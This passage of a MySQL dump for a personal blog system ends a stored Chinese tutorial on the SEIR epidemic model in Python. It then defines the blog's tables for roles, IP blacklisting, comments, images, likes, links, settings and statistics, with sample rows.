punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.35</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\'y--\'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#[x1,x2][y1,y2]</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.18</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\'y--\'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#[x1,x2][y1,y2]</span>\nplt<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token number\">0.02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.36</span><span class=\"token punctuation\">,</span><span class=\"token string\">r\"$\\lambda=0.3, \\delta=0.1, \\mu=0.1$\"</span><span class=\"token punctuation\">,</span>color<span class=\"token operator\">=</span><span class=\"token string\">\'black\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>xlabel<span class=\"token punctuation\">(</span><span class=\"token string\">\'e(t)\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>ylabel<span class=\"token punctuation\">(</span><span class=\"token string\">\'i(t)\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <hr> \n <br> \n <h3><a id=\"42_SEIR__344\"></a>4.2 SEIR 模型的相轨迹分析</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615201228296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210615201236621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> 上图为例程 4.2 的运行结果，是 SEIR 模型的相轨迹图。</p> \n <p>图中每一条 e-s 曲线，从直线 i(t)+s(t)=1 上的某一初值点出发，最终收敛于 s轴上的某一点，对应着某一个初值条件下的患病者与易感者比例随时间的变化关系。</p> \n <p>SEIR 模型的相轨迹图比较复杂，难以在本文展开进行讨论。但是，相轨迹图中的虚线还是反映出了时间变化曲线图中难以表达的一些重要特征，以此为线索可以进行更深入的研究。</p> \n <hr> \n <br> \n <h2><a id=\"5_SEIR__357\"></a>5. SEIR 模型结果讨论</h2> \n <p>最后，我们简单总结一下 SEIR 模型的特点：</p> \n <ol>\n  <li> <p>SEIR 模型是一个单向模型，易感者（S）不断转变为潜伏者（E），潜伏者（E）发病后成为患病者（I），患病者（I）不断转变为康复者（R），因此易感者比例 s(t) 单调递减，康复者比例 r(i) 单调递增。</p> </li>\n  <li> <p>SEIR 模型假设潜伏期无传染性，因此潜伏期延迟了传染期的开始，疫情发生和峰值的到来要晚于没有潜伏期的 SIR 模型。但潜伏期不会改变感染人群的累计数量，而且持续时间更长。</p> </li>\n  <li> <p><span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> 1 / σ 1/\\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 是传染病蔓延的阈值，满足 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 &gt; 1 / σ s_0&gt;1/\\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.6891em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 才会发生传染病蔓延。因此，为了控制传染病的蔓延：一方面要提高阈值 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> 1 / σ 1/\\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span>，这可以通过提高卫生水平来降低日接触率<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span>、提高医疗水平来提高日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span>；另一方面要降低 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.58056em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>，这可以通过预防接种达到群体免疫来实现。</p> </li>\n  <li> <p>在 SEIR 模型的基础上，可以根据不同传染病病理特征及疫情传播特点，对模型进行进一步的改进，使模型与实际情况更加吻合，以便更准确地预测疫情发展趋势。</p> </li>\n  <li> <p>在 SEIR 模型的基础上，可以结合实际的疫情数据来拟合和估计模型参数，进而用来模拟和分析不同治疗方案和防控措施对疫情发展的影响，为新冠疫情的防控工作提供决策指导。</p> </li>\n </ol> \n <br> \n <p><strong>【本节完】</strong></p> \n <p><strong>版权声明：</strong></p> \n <p><strong>欢迎关注<a href=\"https://blog.csdn.net/youcans/category_11031563.html\">『Python小白的数学建模课 @ Youcans』</a> 原创作品</strong></p> \n <p>原创作品，转载必须标注原文链接：(https://blog.csdn.net/youcans/article/details/117932162)。</p> \n <p>Copyright 2021 Youcans, XUPT</p> \n <p>Crated：2021-06-15</p> \n <br> \n <br> \n <blockquote> \n  <p><strong>欢迎关注 <a href=\"https://blog.csdn.net/youcans/category_11031563.html\">『Python小白的数学建模课 @ Youcans』</a> 系列，持续更新</strong><br> <a href=\"https://blog.csdn.net/youcans/article/details/117295222\">Python小白的数学建模课-01.新手必读</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117333479\">Python小白的数学建模课-02.数据导入</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117388930\">Python小白的数学建模课-03.线性规划</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117419635\">Python小白的数学建模课-04.整数规划</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117463682\">Python小白的数学建模课-05.0-1规划</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117618928\">Python小白的数学建模课-06.固定费用问题</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117650843\">Python小白的数学建模课-07.选址问题</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117702996\">Python小白的数学建模课-09.微分方程模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/118162990\">Python小白的数学建模课-10.微分方程边值问题</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117410678\">Python小白的数学建模课-A1.国赛赛题类型分析</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117357477\">Python小白的数学建模课-A2.2021年数维杯C题探讨</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117519025\">Python小白的数学建模课-A3.12个新冠疫情数模竞赛赛题及短评</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117740466\">Python小白的数学建模课-B2. 新冠疫情 SI模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117786272\">Python小白的数学建模课-B3. 新冠疫情 SIS模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117843875\">Python小白的数学建模课-B4. 新冠疫情 SIR模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117932162\">Python小白的数学建模课-B5. 新冠疫情 SEIR模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/118084539\">Python小白的数学建模课-B6. 新冠疫情 SEIR改进模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/116371416\">Python数模笔记-PuLP库</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/116448853\">Python数模笔记-StatsModels统计回归</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/116596017\">Python数模笔记-Sklearn</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/116999881\">Python数模笔记-NetworkX</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/116371656\">Python数模笔记-模拟退火算法</a></p> \n </blockquote> \n <br> \n <br> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);

-- ----------------------------
-- Table structure for t_authority
-- ----------------------------
DROP TABLE IF EXISTS `t_authority`;
CREATE TABLE `t_authority`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `authority` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '权限',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_authority
-- ----------------------------
INSERT INTO `t_authority` VALUES (1, 'ROLE_admin');
INSERT INTO `t_authority` VALUES (2, 'ROLE_common');

-- ----------------------------
-- Table structure for t_blacklist
-- ----------------------------
DROP TABLE IF EXISTS `t_blacklist`;
CREATE TABLE `t_blacklist`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `black_ip` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '黑名单IP',
  `black_address` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '黑名单IP对应的地址',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `black_ip`(`black_ip`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_blacklist
-- ----------------------------

-- ----------------------------
-- Table structure for t_categories
-- ----------------------------
DROP TABLE IF EXISTS `t_categories`;
CREATE TABLE `t_categories`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `categoryName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `categoryCount` int(11) NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `categoryName`(`categoryName`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_categories
-- ----------------------------
INSERT INTO `t_categories` VALUES (1, '默认分类', 5);
INSERT INTO `t_categories` VALUES (3, 'Spring', 3);
INSERT INTO `t_categories` VALUES (4, 'SpringBoot', 2);
INSERT INTO `t_categories` VALUES (6, '奔驰G63', 1);
INSERT INTO `t_categories` VALUES (7, '666', 0);

-- ----------------------------
-- Table structure for t_comment
-- ----------------------------
DROP TABLE IF EXISTS `t_comment`;
CREATE TABLE `t_comment`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '评论id',
  `article_id` int(11) NOT NULL COMMENT '关联的文章id',
  `created` date NOT NULL COMMENT '评论时间',
  `ip` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '评论用户登录的ip地址',
  `c_content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论内容',
  `status` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'approved' COMMENT '评论状态',
  `author` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论用户用户名',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 22 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_comment
-- ----------------------------
INSERT INTO `t_comment` VALUES (1, 12, '2018-12-13', '0:0:0:0:0:0:0:1', '很不错，不过这文章排版不太好看啊', 'approved', '李四');
INSERT INTO `t_comment` VALUES (2, 11, '2018-12-13', '0:0:0:0:0:0:0:1', '很不错的原理分析，受用了！', 'approved', '李四');
INSERT INTO `t_comment` VALUES (3, 10, '2018-12-13', '0:0:0:0:0:0:0:1', '关于Docker虚拟容器的讲解挺好的额，学习中', 'approved', '李四');
INSERT INTO `t_comment` VALUES (9, 1, '2018-12-13', '0:0:0:0:0:0:0:1', '非常不错，赞一个！', 'approved', '李四');
INSERT INTO `t_comment` VALUES (10, 1, '2018-12-13', '0:0:0:0:0:0:0:1', '博主，这资料怎么弄的？有相关资源和教材推荐吗？', 'approved', '李四');
INSERT INTO `t_comment` VALUES (11, 1, '2018-12-13', '0:0:0:0:0:0:0:1', '很详细，感谢...', 'approved', '东方不败');
INSERT INTO `t_comment` VALUES (12, 1, '2018-12-13', '0:0:0:0:0:0:0:1', '很全，努力学习中...', 'approved', '东方不败');
INSERT INTO `t_comment` VALUES (13, 1, '2018-12-13', '0:0:0:0:0:0:0:1', '好东西，先收藏起来，哈哈', 'approved', 'tom');
INSERT INTO `t_comment` VALUES (14, 8, '2018-12-13', '0:0:0:0:0:0:0:1', 'very good blog', 'approved', 'tom');
INSERT INTO `t_comment` VALUES (15, 9, '2019-03-30', '0:0:0:0:0:0:0:1', 'asdaa阿斯顿', 'approved', 'tom');
INSERT INTO `t_comment` VALUES (17, 2, '2021-05-20', '0:0:0:0:0:0:0:1', '111222', 'approved', 'tom');
INSERT INTO `t_comment` VALUES (20, 1, '2021-05-27', '0:0:0:0:0:0:0:1', '66666', 'no_audit', 'admin');
INSERT INTO `t_comment` VALUES (21, 12, '2021-06-02', '0:0:0:0:0:0:0:1', 'hello', 'no_audit', 'admin');

-- ----------------------------
-- Table structure for t_img
-- ----------------------------
DROP TABLE IF EXISTS `t_img`;
CREATE TABLE `t_img`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `big_img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '大图',
  `small_img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '缩略图',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 56 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_img
-- ----------------------------
INSERT INTO `t_img` VALUES (40, '/big_img/737a8c142adc4ced96da6e74299583cc.jpg', '/small_img/15cbc114f6dc4b989d3572d00d39b98a.jpg');
INSERT INTO `t_img` VALUES (41, '/big_img/d56f5256b92843f79bd8c18d9db42cbc.jpg', '/small_img/fb13f900136d4249b88bb22a261ea073.jpg');
INSERT INTO `t_img` VALUES (42, '/big_img/0626624dfce74d1e82bb809c756d0e94.jpg', '/small_img/09fc4b62bbf44ea2b0109bf1b442a426.jpg');
INSERT INTO `t_img` VALUES (43, '/big_img/2eb18727a9e24f88987fd24c7a1a0530.jpg', '/small_img/f928d7e8be8447a9a843e2cbd90bd4e9.jpg');
INSERT INTO `t_img` VALUES (44, '/big_img/a1ec722d5206473cb23d9e7a7eeea1f1.jpg', '/small_img/7730f5c1b2ae4c4ca945bcbfac423b89.jpg');
INSERT INTO `t_img` VALUES (45, '/big_img/922a534b91bc45fba9a72b3c1f20154e.jpg', '/small_img/c2fc213600384af89debb4686b3bb9e6.jpg');
INSERT INTO `t_img` VALUES (46, '/big_img/006944ba01ff40afa8a690e77d77cfe8.jpg', '/small_img/9201675f0af1425baddd454b8a5a9dfc.jpg');
INSERT INTO `t_img` VALUES (47, '/big_img/97ad47ff95ed4de18ebef5838fdca7d8.jpg', '/small_img/0df93f830ef142e0862db407ebf55dd9.jpg');
INSERT INTO `t_img` VALUES (48, '/big_img/d0a16d4a86994c2c9f0debdc8cc28eb1.jpg', '/small_img/718e6982dd2e476880112f6a529192f3.jpg');
INSERT INTO `t_img` VALUES (49, '/big_img/97c6b63df1a949ce9c4df53307f92ee0.png', '/small_img/90575e68d84c4232b0727c7d255595bb.png');
INSERT INTO `t_img` VALUES (50, '/big_img/06a8784208bf492caa96890341b49150.png', '/small_img/3ad349ea0eb149fbaa3c750f1a036d80.png');
INSERT INTO `t_img` VALUES (51, '/big_img/91a14d49f03e4129b09834cdabd5724f.png', '/small_img/c8f03e4be38f49c38acca26cb0aee02a.png');
INSERT INTO `t_img` VALUES (52, '/big_img/960440b3921f48e88a27b49e42dd39fa.png', '/small_img/1fdddfbd0b9c466c87e0775b18306ddb.png');
INSERT INTO `t_img` VALUES (53, '/big_img/004cca4f3ec940f486aaf1714ea1995e.jpg', '/small_img/f6b8f27e395049928639c3238da37edd.jpg');
INSERT INTO `t_img` VALUES (54, '/big_img/edd2cae3db3244b89cbb3fc16896193e.jpg', '/small_img/a37d2efdc1e0429d85121e676aff0b05.jpg');
INSERT INTO `t_img` VALUES (55, '/big_img/d64ad2e6b01c447ab33c1348d2ddc30b.jpg', '/small_img/4977a325c2694b64981b2edb05ec5b3d.jpg');

-- ----------------------------
-- Table structure for t_intercept
-- ----------------------------
DROP TABLE IF EXISTS `t_intercept`;
CREATE TABLE `t_intercept`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `intercept_ip` varchar(155) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '拦截ip',
  `intercept_address` varchar(155) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '拦截ip所在地址',
  `intercept_browser` varchar(155) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '拦截ip的人使用的浏览器',
  `intercept_os` varchar(155) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '拦截ip的人使用的操作系统',
  `intercept_time` datetime(0) NOT NULL COMMENT '拦截时间',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 41 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_intercept
-- ----------------------------
INSERT INTO `t_intercept` VALUES (39, '192.168.184.1', '', 'Firefox 8', 'Windows 10', '2021-06-28 16:56:03', '用户ip在黑名单');
INSERT INTO `t_intercept` VALUES (40, '192.168.184.1', '', 'Firefox 8', 'Windows 10', '2021-06-28 17:25:09', '用户ip在黑名单');

-- ----------------------------
-- Table structure for t_like
-- ----------------------------
DROP TABLE IF EXISTS `t_like`;
CREATE TABLE `t_like`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '点赞的用户名',
  `article_id` int(11) NOT NULL COMMENT '点赞的文章id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 14 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_like
-- ----------------------------
INSERT INTO `t_like` VALUES (1, '8310894', 36);
INSERT INTO `t_like` VALUES (2, '8310894', 37);
INSERT INTO `t_like` VALUES (3, '8310894', 52);
INSERT INTO `t_like` VALUES (4, '8310894', 39);
INSERT INTO `t_like` VALUES (5, '8310894', 41);
INSERT INTO `t_like` VALUES (6, 'admin', 36);
INSERT INTO `t_like` VALUES (7, 'admin', 37);
INSERT INTO `t_like` VALUES (8, 'admin', 40);
INSERT INTO `t_like` VALUES (9, 'admin', 43);
INSERT INTO `t_like` VALUES (10, 'admin', 44);
INSERT INTO `t_like` VALUES (11, 'admin', 39);
INSERT INTO `t_like` VALUES (12, '8310894', 78);
INSERT INTO `t_like` VALUES (13, '8310894', 77);

-- ----------------------------
-- Table structure for t_link
-- ----------------------------
DROP TABLE IF EXISTS `t_link`;
CREATE TABLE `t_link`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '友情链接的标题',
  `link` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '友情链接的url地址',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_link
-- ----------------------------
INSERT INTO `t_link` VALUES (1, '百度', 'https://www.baidu.com/');
INSERT INTO `t_link` VALUES (2, '新浪微博', 'https://weibo.com/');
INSERT INTO `t_link` VALUES (3, 'GitHub', 'https://github.com/');
INSERT INTO `t_link` VALUES (4, 'bootstrap', 'https://v3.bootcss.com/');
INSERT INTO `t_link` VALUES (5, 'gitee', 'https://gitee.com/');

-- ----------------------------
-- Table structure for t_setting
-- ----------------------------
DROP TABLE IF EXISTS `t_setting`;
CREATE TABLE `t_setting`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `logo` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'user/img/bloglogo.jpg' COMMENT 'logo地址',
  `foot` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '页尾信息',
  `theme` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'calmlog' COMMENT '主题模板',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `name`(`name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_setting
-- ----------------------------
INSERT INTO `t_setting` VALUES (7, 'admin', '/user/img/bloglogo.jpg', '111', 'calmlog');
INSERT INTO `t_setting` VALUES (8, '李四', '/user/img/bloglogo.jpg', '222', 'calmlog');
INSERT INTO `t_setting` VALUES (9, '东方不败', '/user/img/bloglogo.jpg', '333', 'calmlog');
INSERT INTO `t_setting` VALUES (10, 'tom', '/user/img/bloglogo.jpg', '666', 'calmlog');
INSERT INTO `t_setting` VALUES (12, 'deep', '/user/img/bloglogo.jpg', '2021 &copy; Powered By 游政杰', 'calmlog');
INSERT INTO `t_setting` VALUES (14, '8310894', '/user/img/4f8c8e189a444f2d8f87e33d9be2a05d.jpg', '----2022---', 'calmlog');

-- ----------------------------
-- Table structure for t_statistic
-- ----------------------------
DROP TABLE IF EXISTS `t_statistic`;
CREATE TABLE `t_statistic`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL COMMENT '关联的文章id',
  `hits` int(11) NOT NULL DEFAULT 0 COMMENT '文章点击总量',
  `comments_num` int(11) NOT NULL DEFAULT 0 COMMENT '文章评论总量',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 76 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_statistic
-- ----------------------------
INSERT INTO `t_statistic` VALUES (1, 1, 146, 5);
INSERT INTO `t_statistic` VALUES (2, 2, 9, 0);
INSERT INTO `t_statistic` VALUES (3, 3, 6, 0);
INSERT INTO `t_statistic` VALUES (5, 5, 4, 0);
INSERT INTO `t_statistic` VALUES (6, 6, 19, 0);
INSERT INTO `t_statistic` VALUES (7, 7, 13, 0);
INSERT INTO `t_statistic` VALUES (8, 8, 36, 1);
INSERT INTO `t_statistic` VALUES (9, 9, 26, 1);
INSERT INTO `t_statistic` VALUES (10, 10, 24, 1);
INSERT INTO `t_statistic` VALUES (11, 11, 19, 1);
INSERT INTO `t_statistic` VALUES (12, 12, 67, 1);
INSERT INTO `t_statistic` VALUES (15, 37, 11, 0);
INSERT INTO `t_statistic` VALUES (17, 39, 5, 0);
INSERT INTO `t_statistic` VALUES (18, 40, 2, 0);
INSERT INTO `t_statistic` VALUES (19, 41, 4, 0);
INSERT INTO `t_statistic` VALUES (20, 42, 0, 0);
INSERT INTO `t_statistic` VALUES (21, 43, 0, 0);
INSERT INTO `t_statistic` VALUES (22, 44, 1, 0);
INSERT INTO `t_statistic` VALUES (23, 45, 0, 0);
INSERT INTO `t_statistic` VALUES (24, 46, 1, 0);
INSERT INTO `t_statistic` VALUES (25, 47, 1, 0);
INSERT INTO `t_statistic` VALUES (26, 48, 0, 0);
INSERT INTO `t_statistic` VALUES (27, 49, 0, 0);
INSERT INTO `t_statistic` VALUES (28, 50, 0, 0);
INSERT INTO `t_statistic` VALUES (29, 51, 0, 0);
INSERT INTO `t_statistic` VALUES (30, 52, 0, 0);
INSERT INTO `t_statistic` VALUES (31, 53, 0, 0);
INSERT INTO `t_statistic` VALUES (32, 54, 0, 0);
INSERT INTO `t_statistic` VALUES (33, 55, 1, 0);
INSERT INTO `t_statistic` VALUES (34, 56, 0, 0);
INSERT INTO `t_statistic` VALUES (35, 57, 0, 0);
INSERT INTO `t_statistic` VALUES (36, 58, 0, 0);
INSERT INTO `t_statistic` VALUES (37, 59, 0, 0);
INSERT INTO `t_statistic` VALUES (47, 69, 1, 0);
INSERT INTO `t_statistic` VALUES (55, 77, 1, 0);
INSERT INTO `t_statistic` VALUES (56, 78, 0, 0);
INSERT INTO `t_statistic` VALUES (57, 79, 0, 0);
INSERT INTO `t_statistic` VALUES (58, 80, 0, 0);
INSERT INTO `t_statistic` VALUES (59, 81, 0, 0);
INSERT INTO `t_statistic` VALUES (60, 82, 0, 0);
INSERT INTO `t_statistic` VALUES (61, 83, 0, 0);
INSERT INTO `t_statistic` VALUES (62, 84, 0, 0);
INSERT INTO `t_statistic` VALUES (63, 85, 0, 0);
INSERT INTO `t_statistic` VALUES (64, 86, 0, 0);
INSERT INTO `t_statistic` VALUES (65, 87, 0, 0);
INSERT INTO `t_statistic` VALUES (66, 88, 0, 0);
INSERT INTO `t_statistic` VALUES (67, 89, 0, 0);
INSERT INTO `t_statistic` VALUES (68, 90, 0, 0);
INSERT INTO `t_statistic` VALUES (69, 91, 0, 0);
INSERT INTO `t_statistic` VALUES (70, 92, 0, 0);
INSERT INTO `t_statistic` VALUES (71, 93, 0, 0);
INSERT INTO `t_statistic` VALUES (72, 94, 0, 0);
INSERT INTO `t_statistic` VALUES (73, 95, 0, 0);
INSERT INTO `t_statistic` VALUES (74, 96, 0, 0);
INSERT INTO `t_statistic` VALUES (75, 97, 0, 0);

-- ----------------------------
-- Table structure for t_tag
-- ----------------------------
DROP TABLE IF EXISTS `t_tag`;
CREATE TABLE `t_tag`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tagName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `tagCount` int(11) NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `tagName`(`tagName`) USING BTREE
